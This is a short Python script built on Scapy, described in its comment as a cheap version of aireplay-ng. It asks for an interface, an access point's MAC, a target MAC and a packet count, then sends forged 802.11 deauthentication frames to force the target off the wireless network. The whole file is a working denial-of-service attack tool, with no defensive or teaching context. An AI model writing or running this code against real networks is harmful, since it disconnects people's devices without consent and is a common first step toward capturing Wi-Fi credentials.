#This is like a cheap version of aireplay-ng

from scapy.all import *


interface = raw_input("On which interface will you be working? ")

AP = raw_input("Enter the MAC of the AP ")
mark = raw_input("Enter the MAC you wish to deauthenticate ")
num = int(raw_input("How many packets do you wish to send? "))

frame = RadioTap() / Dot11(addr1 = mark, addr2 = AP, addr3 = AP) / Dot11Deauth()

sendp(frame, iface = interface, count = num, inter = 0.1)
